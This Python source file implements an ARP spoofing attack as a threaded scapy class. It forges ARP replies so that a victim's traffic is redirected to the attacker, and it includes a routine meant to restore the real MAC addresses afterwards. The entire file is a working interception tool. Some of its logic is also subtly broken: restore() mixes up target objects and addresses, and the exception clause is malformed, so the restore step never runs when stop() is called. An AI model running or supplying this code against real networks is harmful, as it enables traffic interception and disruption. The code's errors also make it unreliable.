import time
import scapy.all as scapy
from threading import Thread, Event
from lib import logger as _

log = _.log

# execute arp spoofing (is Multi-threaded)
class Spoofer(Thread):
    pkts    = []
    targets = []

    # We know our mac and ip already let save them
    def __init__(self, host, delay = 1):
        super(Spoofer, self).__init__()
        self.exit = Event()
        self.host = host
        self.delay = delay

    # restoring real MACs
    def restore(self, target):
        pkt = scapy.ARP(op=2, pdst=target, hwdst=target.mac, psrc=self.host[0], hwsrc=self.host[1])
        scapy.send(pkt, verbose=False)
        # delete the value from the instance

    # get the mac from the network
    #def get_mac(self, ip):
    #    True

    # We'll send the packet to the target by pretending being the victim
    def spoof(self, victim, target):
        #target_mac = self.get_mac(victim)
        self.targets.append(victim)
        self.pkts.append(scapy.ARP(op=2, hwdst=target.mac, pdst=target.ip, psrc=victim.ip))

    # Thread routine
    def run(self):
        self.exit.clear()
        try:
            while not self.exit.is_set():
                for spoof in self.pkts:
                    scapy.sendp(spoof, verbose=False)
                time.sleep(self.delay)
        except KeyboardInterrupt or self.exit.is_set():
            for key in self.targets:
                self.restore(key)

    # Fire the stop event
    def stop(self):
        self.exit.set();
        log.print("ARP Spoofing stopping, waiting 1 second...")
        time.sleep(1)